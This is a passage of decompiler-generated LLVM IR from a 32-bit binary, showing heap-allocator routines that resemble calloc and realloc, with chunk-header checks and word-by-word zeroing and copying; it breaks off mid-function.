  uselistorder i32 %v1_8050be3, { 0, 2, 1 }
  uselistorder i32 %v0_8050bcc, { 1, 0 }
  uselistorder i32 %v2_8050bb3, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 0, 19, 1, 2, 3, 4, 5, 6, 7, 8, 24, 9, 25, 10, 11, 12, 13, 14, 15, 23, 16, 17, 18, 20, 21, 22 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8054920.49, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_80523e0, { 1, 0 }
  uselistorder i32 134563316, { 1, 3, 0, 2 }
  uselistorder i32* @global_var_8054600.37, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8050b78, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80545ec.34 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80545ec.34 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8051308, { 1, 0 }
  uselistorder label %dec_label_pc_80512f7, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80512ea, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80512e6, { 1, 0 }
  uselistorder label %dec_label_pc_80512dc, { 1, 0 }
  uselistorder label %dec_label_pc_8051287, { 1, 0 }
  uselistorder label %dec_label_pc_805125e, { 1, 0 }
  uselistorder label %dec_label_pc_805124b, { 1, 0 }
  uselistorder label %dec_label_pc_8051239, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80511cb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80511c6, { 1, 0 }
  uselistorder label %dec_label_pc_8051153, { 1, 0 }
  uselistorder label %dec_label_pc_805113c, { 1, 0 }
  uselistorder label %dec_label_pc_8051125, { 1, 0 }
  uselistorder label %dec_label_pc_80510a8, { 1, 0 }
  uselistorder label %dec_label_pc_805109b, { 1, 0 }
  uselistorder label %dec_label_pc_805105c, { 1, 0 }
  uselistorder label %dec_label_pc_8051035, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051019, { 1, 0 }
  uselistorder label %dec_label_pc_8051000, { 1, 0 }
  uselistorder label %dec_label_pc_8050fe2, { 1, 0 }
  uselistorder label %dec_label_pc_8050efd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050ef5, { 1, 0 }
  uselistorder label %dec_label_pc_8050ede, { 1, 0 }
  uselistorder label %dec_label_pc_8050e71, { 1, 0 }
  uselistorder label %dec_label_pc_8050e76.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050e4a, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050dd1, { 1, 0 }
  uselistorder label %dec_label_pc_8050d80, { 1, 0 }
  uselistorder label %dec_label_pc_8050d58, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8050d41, { 1, 0 }
  uselistorder label %dec_label_pc_8050caf, { 1, 0 }
  uselistorder label %dec_label_pc_8050d80.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050c7c, { 1, 0, 3, 2 }
}

define i32 @function_8051312(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051312:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8051312 = load i32, i32* @edi, align 4
  %v0_8051314 = load i32, i32* @ebx, align 4
  %v12_8051315 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8051318 = trunc i64 %arg1 to i32
  %sext = mul i64 %arg1, 4294967296
  %v2_8051322 = sdiv i64 %sext, 4294967296
  %v3_8051322 = sext i32 %arg2 to i64
  %v4_8051322 = mul nsw i64 %v3_8051322, %v2_8051322
  %v5_8051322 = trunc i64 %v4_8051322 to i32
  store i32 %v5_8051322, i32* @ebx, align 4
  %v2_8051325 = icmp eq i32 %v4_8051318, 0
  br i1 %v2_8051325, label %dec_label_pc_8051347, label %dec_label_pc_8051329

dec_label_pc_8051329:                             ; preds = %dec_label_pc_8051312
  store i32 %v4_8051318, i32* @edi, align 4
  %div = udiv i32 %v5_8051322, %v4_8051318
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_8051331 = icmp eq i32 %div, %arg2
  br i1 %v12_8051331, label %dec_label_pc_8051347, label %dec_label_pc_8051335

dec_label_pc_8051335:                             ; preds = %dec_label_pc_8051329
  %v1_8051335 = call i32 @function_805076b(i32 %v0_8051314)
  store i32 %v1_8051335, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805133c = inttoptr i32 %v1_8051335 to i32*
  store i32 12, i32* %v1_805133c, align 4
  br label %dec_label_pc_80513fd

dec_label_pc_8051347:                             ; preds = %dec_label_pc_8051329, %dec_label_pc_8051312
  store i32 %v12_8051315, i32* @eax, align 4
  %v2_8051357 = call i32 @function_80520ca(i32 %v12_8051315, i32 134553799)
  store i32 %v2_8051357, i32* %eax.global-to-local, align 4
  %v1_8051363 = call i32 @function_80520c7(i32 ptrtoint (i32* @global_var_80542e0.32 to i32))
  store i32 %v1_8051363, i32* %eax.global-to-local, align 4
  %v0_8051368 = load i32, i32* @ebx, align 4
  %v1_805136b = call i32 @function_8050b9e(i32 %v0_8051368)
  store i32 %v1_805136b, i32* %eax.global-to-local, align 4
  store i32 %v1_805136b, i32* %ebx.global-to-local, align 4
  %v1_8051375 = icmp eq i32 %v1_805136b, 0
  br i1 %v1_8051375, label %dec_label_pc_80513ec, label %dec_label_pc_8051379

dec_label_pc_8051379:                             ; preds = %dec_label_pc_8051347
  %v1_8051379 = add i32 %v1_805136b, -4
  %v2_8051379 = inttoptr i32 %v1_8051379 to i32*
  %v3_8051379 = load i32, i32* %v2_8051379, align 4
  store i32 %v3_8051379, i32* %eax.global-to-local, align 4
  %v2_805137c = and i32 %v3_8051379, 2
  %v3_805137c = icmp eq i32 %v2_805137c, 0
  %v1_805137e = icmp eq i1 %v3_805137c, false
  br i1 %v1_805137e, label %dec_label_pc_80513ec, label %dec_label_pc_8051380

dec_label_pc_8051380:                             ; preds = %dec_label_pc_8051379
  %v1_80513804 = add i32 %v3_8051379, -4
  %v1_8051383 = and i32 %v1_80513804, -4
  %v2_8051388 = udiv i32 %v1_8051383, 4
  store i32 %v2_8051388, i32* %eax.global-to-local, align 4
  %v5_805138b = icmp ult i32 %v1_8051383, 36
  %tmp = and i32 %v1_80513804, -4
  %tmp19 = icmp eq i32 %tmp, 36
  %v2_805138e = or i1 %v5_805138b, %tmp19
  br i1 %v2_805138e, label %dec_label_pc_805139f, label %dec_label_pc_8051390

dec_label_pc_8051390:                             ; preds = %dec_label_pc_8051380
  %v3_8051395 = inttoptr i32 %v1_805136b to i8*
  %v4_8051395 = call i32 @function_80507bc(i8* %v3_8051395, i32 0, i32 %v1_8051383)
  store i32 %v4_8051395, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513ec

dec_label_pc_805139f:                             ; preds = %dec_label_pc_8051380
  %v1_805139f = inttoptr i32 %v1_805136b to i32*
  store i32 0, i32* %v1_805139f, align 4
  %v0_80513a5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513a5 = add i32 %v0_80513a5, 4
  %v2_80513a5 = inttoptr i32 %v1_80513a5 to i32*
  store i32 0, i32* %v2_80513a5, align 4
  %v0_80513ac = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513ac = add i32 %v0_80513ac, 8
  %v2_80513ac = inttoptr i32 %v1_80513ac to i32*
  store i32 0, i32* %v2_80513ac, align 4
  %v0_80513b3 = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_80513b3, 5
  br i1 %tmp16, label %dec_label_pc_80513ec, label %dec_label_pc_80513b8

dec_label_pc_80513b8:                             ; preds = %dec_label_pc_805139f
  %v0_80513b8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513b8 = add i32 %v0_80513b8, 12
  %v2_80513b8 = inttoptr i32 %v1_80513b8 to i32*
  store i32 0, i32* %v2_80513b8, align 4
  %v0_80513bf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513bf = add i32 %v0_80513bf, 16
  %v2_80513bf = inttoptr i32 %v1_80513bf to i32*
  store i32 0, i32* %v2_80513bf, align 4
  %v0_80513c6 = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_80513c6, 7
  br i1 %tmp17, label %dec_label_pc_80513ec, label %dec_label_pc_80513cb

dec_label_pc_80513cb:                             ; preds = %dec_label_pc_80513b8
  %v0_80513cb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513cb = add i32 %v0_80513cb, 20
  %v2_80513cb = inttoptr i32 %v1_80513cb to i32*
  store i32 0, i32* %v2_80513cb, align 4
  %v0_80513d2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513d2 = add i32 %v0_80513d2, 24
  %v2_80513d2 = inttoptr i32 %v1_80513d2 to i32*
  store i32 0, i32* %v2_80513d2, align 4
  %v0_80513d9 = load i32, i32* %eax.global-to-local, align 4
  %tmp18 = icmp ult i32 %v0_80513d9, 9
  br i1 %tmp18, label %dec_label_pc_80513ec, label %dec_label_pc_80513de

dec_label_pc_80513de:                             ; preds = %dec_label_pc_80513cb
  %v0_80513de = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513de = add i32 %v0_80513de, 28
  %v2_80513de = inttoptr i32 %v1_80513de to i32*
  store i32 0, i32* %v2_80513de, align 4
  %v0_80513e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513e5 = add i32 %v0_80513e5, 32
  %v2_80513e5 = inttoptr i32 %v1_80513e5 to i32*
  store i32 0, i32* %v2_80513e5, align 4
  br label %dec_label_pc_80513ec

dec_label_pc_80513ec:                             ; preds = %dec_label_pc_80513cb, %dec_label_pc_80513b8, %dec_label_pc_805139f, %dec_label_pc_8051379, %dec_label_pc_8051347, %dec_label_pc_8051390, %dec_label_pc_80513de
  store i32 %v12_8051315, i32* @eax, align 4
  %v2_80513f5 = call i32 @function_80520ca(i32 %v12_8051315, i32 1)
  store i32 %v2_80513f5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513fd

dec_label_pc_80513fd:                             ; preds = %dec_label_pc_8051335, %dec_label_pc_80513ec
  %v0_8051400 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051400, i32* %eax.global-to-local, align 4
  store i32 %v0_8051314, i32* @ebx, align 4
  store i32 %v0_8051312, i32* @edi, align 4
  ret i32 %v0_8051400

; uselistorder directives
  uselistorder i32 %v1_8051383, { 2, 1, 0 }
  uselistorder i32 %v1_805136b, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i64 4294967296, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80513fd, { 1, 0 }
  uselistorder label %dec_label_pc_80513ec, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_8051406() local_unnamed_addr {
dec_label_pc_8051406:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8051406 = load i32, i32* @ebp, align 4
  %v0_8051407 = load i32, i32* @edi, align 4
  %v0_8051408 = load i32, i32* @esi, align 4
  %v0_8051409 = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_8051411 = icmp eq i32 %tmp6, 0
  %v1_8051416 = icmp eq i1 %v4_8051411, false
  br i1 %v1_8051416, label %dec_label_pc_8051428, label %dec_label_pc_8051418

dec_label_pc_8051418:                             ; preds = %dec_label_pc_8051406
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_805141c = call i32 @function_8050b9e(i32 %tmp7)
  store i32 %v1_805141c, i32* %eax.global-to-local, align 4
  store i32 %v1_805141c, i32* @ebx, align 4
  br label %dec_label_pc_8051721

dec_label_pc_8051428:                             ; preds = %dec_label_pc_8051406
  %v1_8051428 = icmp eq i32 %tmp7, 0
  %v1_805142a = icmp eq i1 %v1_8051428, false
  br i1 %v1_805142a, label %dec_label_pc_805143d, label %dec_label_pc_805142c

dec_label_pc_805142c:                             ; preds = %dec_label_pc_8051428
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8051433 = call i32 @function_8051963(i32 %tmp6)
  store i32 %v1_8051433, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051721

dec_label_pc_805143d:                             ; preds = %dec_label_pc_8051428
  %v2_8051448 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051448, i32* @eax, align 4
  store i32 %v2_8051448, i32* %stack_var_-60, align 4
  %v2_805144d = call i32 @function_80520ca(i32 %v2_8051448, i32 134553799)
  store i32 %v2_805144d, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80542e0.32 to i32), i32* %stack_var_-60, align 4
  %v1_8051459 = call i32 @function_80520c7(i32 ptrtoint (i32* @global_var_80542e0.32 to i32))
  store i32 %v1_8051459, i32* %eax.global-to-local, align 4
  %v0_8051461 = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_8051461, -32
  br i1 %tmp20, label %dec_label_pc_8051478, label %dec_label_pc_8051466

dec_label_pc_8051466:                             ; preds = %dec_label_pc_805143d
  %v0_8051466 = load i32, i32* %stack_var_-60, align 4
  %v1_8051466 = call i32 @function_805076b(i32 %v0_8051466)
  store i32 %v1_8051466, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805146d = inttoptr i32 %v1_8051466 to i32*
  store i32 12, i32* %v1_805146d, align 4
  br label %dec_label_pc_8051724

dec_label_pc_8051478:                             ; preds = %dec_label_pc_805143d
  %v1_8051478 = add i32 %v0_8051461, 11
  %tmp21 = icmp ult i32 %v1_8051478, 16
  %v1_8051488 = and i32 %v1_8051478, -8
  %v1_8051478.v1_8051488 = select i1 %tmp21, i32 %v1_8051478, i32 %v1_8051488
  %.v1_8051488 = select i1 %tmp21, i32 16, i32 %v1_8051488
  store i32 %v1_8051478.v1_8051488, i32* %eax.global-to-local, align 4
  %v1_8051493 = add i32 %tmp6, -8
  store i32 %v1_8051493, i32* @edi, align 4
  %v1_8051496 = add i32 %tmp6, -4
  %v2_8051496 = inttoptr i32 %v1_8051496 to i32*
  %v3_8051496 = load i32, i32* %v2_8051496, align 4
  store i32 %v3_8051496, i32* @edx, align 4
  %v1_805149b = and i32 %v3_8051496, -4
  store i32 %v1_805149b, i32* %eax.global-to-local, align 4
  %v2_80514a2 = and i32 %v3_8051496, 2
  %v3_80514a2 = icmp eq i32 %v2_80514a2, 0
  %v1_80514a5 = icmp eq i1 %v3_80514a2, false
  br i1 %v1_80514a5, label %dec_label_pc_805163f, label %dec_label_pc_80514ab

dec_label_pc_80514ab:                             ; preds = %dec_label_pc_8051478
  store i32 %.v1_8051488, i32* %ecx.global-to-local, align 4
  store i32 %v1_805149b, i32* @ebx, align 4
  %v7_80514b1 = icmp ult i32 %v1_805149b, %.v1_8051488
  %v1_80514b3 = icmp eq i1 %v7_80514b1, false
  br i1 %v1_80514b3, label %dec_label_pc_80515ea, label %dec_label_pc_80514b9

dec_label_pc_80514b9:                             ; preds = %dec_label_pc_80514ab
  %v2_80514b9 = add i32 %v1_805149b, %v1_8051493
  store i32 %v2_80514b9, i32* @esi, align 4
  %v1_80514bc = load i32, i32* @global_var_80545ec.34, align 4
  %v12_80514bc = icmp eq i32 %v2_80514b9, %v1_80514bc
  %v1_80514c2 = icmp eq i1 %v12_80514bc, false
  %v1_80514fc = add i32 %v2_80514b9, 4
  %v2_80514fc = inttoptr i32 %v1_80514fc to i32*
  %v3_80514fc = load i32, i32* %v2_80514fc, align 4
  br i1 %v1_80514c2, label %dec_label_pc_80514fc, label %dec_label_pc_80514c4

dec_label_pc_80514c4:                             ; preds = %dec_label_pc_80514b9
  %v1_80514c9 = and i32 %v3_80514fc, -4
  %v2_80514cc = add i32 %v1_80514c9, %v1_805149b
  store i32 %v2_80514cc, i32* %ecx.global-to-local, align 4
  %v1_80514d2 = add i32 %.v1_8051488, 16
  store i32 %v1_80514d2, i32* %eax.global-to-local, align 4
  %v7_80514d5 = icmp ult i32 %v2_80514cc, %v1_80514d2
  br i1 %v7_80514d5, label %dec_label_pc_805153a, label %dec_label_pc_80514d9

dec_label_pc_80514d9:                             ; preds = %dec_label_pc_80514c4
  %v1_80514d9 = urem i32 %v3_8051496, 2
  %v5_80514dc = or i32 %v1_80514d9, %.v1_8051488
  store i32 %v5_80514dc, i32* @edx, align 4
  store i32 %v5_80514dc, i32* %v2_8051496, align 4
  %v0_80514e7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80514e7 = sub i32 %v0_80514e7, %.v1_8051488
  %v0_80514e9 = load i32, i32* @edi, align 4
  %v2_80514e9 = add i32 %v0_80514e9, %.v1_8051488
  store i32 %v2_80514e9, i32* %eax.global-to-local, align 4
  %v1_80514ec = or i32 %v2_80514e7, 1
  store i32 %v1_80514ec, i32* %ecx.global-to-local, align 4
  store i32 %v2_80514e9, i32* @global_var_80545ec.34, align 4
  %v2_80514f4 = add i32 %v2_80514e9, 4
  %v3_80514f4 = inttoptr i32 %v2_80514f4 to i32*
  store i32 %v1_80514ec, i32* %v3_80514f4, align 4
  br label %dec_label_pc_805170f

dec_label_pc_80514fc:                             ; preds = %dec_label_pc_80514b9
  %v1_8051501 = and i32 %v3_80514fc, -2
  store i32 %v1_8051501, i32* %eax.global-to-local, align 4
  %v3_8051504 = add i32 %v1_80514fc, %v1_8051501
  %v4_8051504 = inttoptr i32 %v3_8051504 to i8*
  %v5_8051504 = load i8, i8* %v4_8051504, align 1
  %v6_8051504 = urem i8 %v5_8051504, 2
  %v7_8051504 = icmp eq i8 %v6_8051504, 0
  %v1_8051509 = icmp eq i1 %v7_8051504, false
  br i1 %v1_8051509, label %dec_label_pc_805153a, label %dec_label_pc_805150b

dec_label_pc_805150b:                             ; preds = %dec_label_pc_80514fc
  %v1_805150b = and i32 %v3_80514fc, -4
  %v2_8051512 = add i32 %v1_805150b, %v1_805149b
  store i32 %v2_8051512, i32* @ebx, align 4
  %v10_8051514 = icmp ult i32 %v2_8051512, %.v1_8051488
  br i1 %v10_8051514, label %dec_label_pc_805153a, label %dec_label_pc_805151a

dec_label_pc_805151a:                             ; preds = %dec_label_pc_805150b
  %v1_805151a = add i32 %v1_805149b, %tmp6
  %v2_805151a = inttoptr i32 %v1_805151a to i32*
  %v3_805151a = load i32, i32* %v2_805151a, align 4
  store i32 %v3_805151a, i32* @edx, align 4
  %v1_805151d = add i32 %v2_80514b9, 12
  %v2_805151d = inttoptr i32 %v1_805151d to i32*
  %v3_805151d = load i32, i32* %v2_805151d, align 4
  store i32 %v3_805151d, i32* %eax.global-to-local, align 4
  %v1_8051520 = add i32 %v3_805151a, 12
  %v2_8051520 = inttoptr i32 %v1_8051520 to i32*
  %v3_8051520 = load i32, i32* %v2_8051520, align 4
  %v15_8051520 = icmp eq i32 %v3_8051520, %v2_80514b9
  %v1_8051523 = icmp eq i1 %v15_8051520, false
  br i1 %v1_8051523, label %dec_label_pc_805152a, label %dec_label_pc_8051525

dec_label_pc_8051525:                             ; preds = %dec_label_pc_805151a
  %v1_8051525 = add i32 %v3_805151d, 8
  %v2_8051525 = inttoptr i32 %v1_8051525 to i32*
  %v3_8051525 = load i32, i32* %v2_8051525, align 4
  %v15_8051525 = icmp eq i32 %v3_8051525, %v2_80514b9
  br i1 %v15_8051525, label %dec_label_pc_805152f, label %dec_label_pc_805152a

dec_label_pc_805152a:                             ; preds = %dec_label_pc_8051525, %dec_label_pc_805151a
  %v0_805152a = call i32 @function_8051aff()
  store i32 %v0_805152a, i32* %eax.global-to-local, align 4
  %v1_805152f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805152f

dec_label_pc_805152f:                             ; preds = %dec_label_pc_8051525, %dec_label_pc_805152a
  %v1_805152f = phi i32 [ %v3_805151a, %dec_label_pc_8051525 ], [ %v1_805152f.pre, %dec_label_pc_805152a ]
  %v0_805152f = phi i32 [ %v3_805151d, %dec_label_pc_8051525 ], [ %v0_805152a, %dec_label_pc_805152a ]
  %v2_805152f = add i32 %v1_805152f, 12
  %v3_805152f = inttoptr i32 %v2_805152f to i32*
  store i32 %v0_805152f, i32* %v3_805152f, align 4
  %v0_8051532 = load i32, i32* @edx, align 4
  %v1_8051532 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051532 = add i32 %v1_8051532, 8
  %v3_8051532 = inttoptr i32 %v2_8051532 to i32*
  store i32 %v0_8051532, i32* %v3_8051532, align 4
  %v0_80515ea.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80515ea

dec_label_pc_805153a:                             ; preds = %dec_label_pc_805150b, %dec_label_pc_80514fc, %dec_label_pc_80514c4
  %v1_8051541 = add i32 %.v1_8051488, -7
  store i32 %v1_8051541, i32* %eax.global-to-local, align 4
  store i32 %v1_8051541, i32* %stack_var_-60, align 4
  %v1_8051545 = call i32 @function_8050b9e(i32 %v1_8051541)
  store i32 %v1_8051545, i32* %eax.global-to-local, align 4
  store i32 %v1_8051545, i32* @edx, align 4
  %v1_805154f = icmp eq i32 %v1_8051545, 0
  br i1 %v1_805154f, label %dec_label_pc_805170b, label %dec_label_pc_8051557

dec_label_pc_8051557:                             ; preds = %dec_label_pc_805153a
  %v1_8051557 = add i32 %v1_8051545, -8
  store i32 %v1_8051557, i32* %ebx.global-to-local, align 4
  %v1_805155a = load i32, i32* @esi, align 4
  %v12_805155a = icmp eq i32 %v1_8051557, %v1_805155a
  %v1_805155c = add i32 %v1_8051545, -4
  %v2_805155c = inttoptr i32 %v1_805155c to i32*
  %v3_805155c = load i32, i32* %v2_805155c, align 4
  store i32 %v3_805155c, i32* %eax.global-to-local, align 4
  %v1_805155f = icmp eq i1 %v12_805155a, false
  br i1 %v1_805155f, label %dec_label_pc_805156d, label %dec_label_pc_8051561

dec_label_pc_8051561:                             ; preds = %dec_label_pc_8051557
  %v1_8051561 = and i32 %v3_805155c, -4
  store i32 %v1_8051561, i32* %eax.global-to-local, align 4
  store i32 %v1_805149b, i32* @edx, align 4
  %v2_8051568 = add i32 %v1_8051561, %v1_805149b
  store i32 %v2_8051568, i32* @ebx, align 4
  br label %dec_label_pc_80515ea

dec_label_pc_805156d:                             ; preds = %dec_label_pc_8051557
  %v1_8051571 = add i32 %v1_805149b, -4
  store i32 %v1_8051571, i32* %eax.global-to-local, align 4
  %v2_8051576 = udiv i32 %v1_8051571, 4
  store i32 %v2_8051576, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051571, 37
  br i1 %tmp, label %dec_label_pc_805158f, label %dec_label_pc_805157e

dec_label_pc_805157e:                             ; preds = %dec_label_pc_805156d
  store i32 %v1_8051545, i32* %stack_var_-60, align 4
  %v3_8051585 = inttoptr i32 %v1_8051545 to i16*
  %v4_8051585 = call i32 @function_805298a(i16* %v3_8051585, i32 %tmp6, i32 %v1_8051571)
  store i32 %v4_8051585, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80515d6

dec_label_pc_805158f:                             ; preds = %dec_label_pc_805156d
  store i32 %tmp6, i32* @esi, align 4
  %v1_8051596 = inttoptr i32 %tmp6 to i32*
  %v2_8051596 = load i32, i32* %v1_8051596, align 4
  store i32 %v2_8051596, i32* %eax.global-to-local, align 4
  %v2_8051598 = inttoptr i32 %v1_8051545 to i32*
  store i32 %v2_8051596, i32* %v2_8051598, align 4
  %v0_805159a = load i32, i32* @esi, align 4
  %v1_805159a = add i32 %v0_805159a, 4
  %v2_805159a = inttoptr i32 %v1_805159a to i32*
  %v3_805159a = load i32, i32* %v2_805159a, align 4
  store i32 %v3_805159a, i32* %eax.global-to-local, align 4
  %v1_805159d = load i32, i32* @edx, align 4
  %v2_805159d = add i32 %v1_805159d, 4
  %v3_805159d = inttoptr i32 %v2_805159d to i32*
  store i32 %v3_805159a, i32* %v3_805159d, align 4
  %v0_80515a0 = load i32, i32* @esi, align 4
  %v1_80515a0 = add i32 %v0_80515a0, 8
  %v2_80515a0 = inttoptr i32 %v1_80515a0 to i32*
  %v3_80515a0 = load i32, i32* %v2_80515a0, align 4
  store i32 %v3_80515a0, i32* %eax.global-to-local, align 4
  %v1_80515a3 = load i32, i32* @edx, align 4
  %v2_80515a3 = add i32 %v1_80515a3, 8
  %v3_80515a3 = inttoptr i32 %v2_80515a3 to i32*
  store i32 %v3_80515a0, i32* %v3_80515a3, align 4
  %tmp27 = icmp ult i32 %v1_8051571, 17
  br i1 %tmp27, label %dec_label_pc_80515d6, label %dec_label_pc_80515a8

dec_label_pc_80515a8:                             ; preds = %dec_label_pc_805158f
  %v0_80515a8 = load i32, i32* @esi, align 4
  %v1_80515a8 = add i32 %v0_80515a8, 12
  %v2_80515a8 = inttoptr i32 %v1_80515a8 to i32*
  %v3_80515a8 = load i32, i32* %v2_80515a8, align 4
  store i32 %v3_80515a8, i32* %eax.global-to-local, align 4
  %v0_80515ab = load i32, i32* %ecx.global-to-local, align 4
  %v1_80515ae = load i32, i32* @edx, align 4
  %v2_80515ae = add i32 %v1_80515ae, 12
  %v3_80515ae = inttoptr i32 %v2_80515ae to i32*
  store i32 %v3_80515a8, i32* %v3_80515ae, align 4
  %v0_80515b1 = load i32, i32* @esi, align 4
  %v1_80515b1 = add i32 %v0_80515b1, 16
  %v2_80515b1 = inttoptr i32 %v1_80515b1 to i32*
  %v3_80515b1 = load i32, i32* %v2_80515b1, align 4
  store i32 %v3_80515b1, i32* %eax.global-to-local, align 4
  %v1_80515b4 = load i32, i32* @edx, align 4
  %v2_80515b4 = add i32 %v1_80515b4, 16
  %v3_80515b4 = inttoptr i32 %v2_80515b4 to i32*
  store i32 %v3_80515b1, i32* %v3_80515b4, align 4
  %tmp22 = icmp ult i32 %v0_80515ab, 7
  br i1 %tmp22, label %dec_label_pc_80515d6, label %dec_label_pc_80515b9

dec_label_pc_80515b9:                             ; preds = %dec_label_pc_80515a8
  %v0_80515b9 = load i32, i32* @esi, align 4
  %v1_80515b9 = add i32 %v0_80515b9, 20
  %v2_80515b9 = inttoptr i32 %v1_80515b9 to i32*
  %v3_80515b9 = load i32, i32* %v2_80515b9, align 4
  store i32 %v3_80515b9, i32* %eax.global-to-local, align 4
  %v0_80515bc = load i32, i32* %ecx.global-to-local, align 4
  %v1_80515bf = load i32, i32* @edx, align 4
  %v2_80515bf = add i32 %v1_80515bf, 20
  %v3_80515bf = inttoptr i32 %v2_80515bf to i32*
  store i32 %v3_80515b9, i32* %v3_80515bf, align 4
  %v0_80515c2 = load i32, i32* @esi, align 4
  %v1_80515c2 = add i32 %v0_80515c2, 24
  %v2_80515c2 = inttoptr i32 %v1_80515c2 to i32*
  %v3_80515c2 = load i32, i32* %v2_80515c2, align 4
  store i32 %v3_80515c2, i32* %eax.global-to-local, align 4
  %v1_80515c5 = load i32, i32* @edx, align 4
  %v2_80515c5 = add i32 %v1_80515c5, 24
  %v3_80515c5 = inttoptr i32 %v2_80515c5 to i32*
  store i32 %v3_80515c2, i32* %v3_80515c5, align 4
  %tmp23 = icmp ult i32 %v0_80515bc, 9
  br i1 %tmp23, label %dec_label_pc_80515d6, label %dec_label_pc_80515ca

dec_label_pc_80515ca:                             ; preds = %dec_label_pc_80515b9
  %v0_80515ca = load i32, i32* @esi, align 4
  %v1_80515ca = add i32 %v0_80515ca, 28
  %v2_80515ca = inttoptr i32 %v1_80515ca to i32*
  %v3_80515ca = load i32, i32* %v2_80515ca, align 4
  store i32 %v3_80515ca, i32* %eax.global-to-local, align 4
  %v1_80515cd = load i32, i32* @edx, align 4
  %v2_80515cd = add i32 %v1_80515cd, 28
  %v3_80515cd = inttoptr i32 %v2_80515cd to i32*
  store i32 %v3_80515ca, i32* %v3_80515cd, align 4
  %v0_80515d0 = load i32, i32* @esi, align 4
  %v1_80515d0 = add i32 %v0_80515d0, 32
  %v2_80515d0 = inttoptr i32 %v1_80515d0 to i32*
  %v3_80515d0 = load i32, i32* %v2_80515d0, align 4
  store i32 %v3_80515d0, i32* %eax.global-to-local, align 4
  %v1_80515d3 = load i32, i32* @edx, align 4
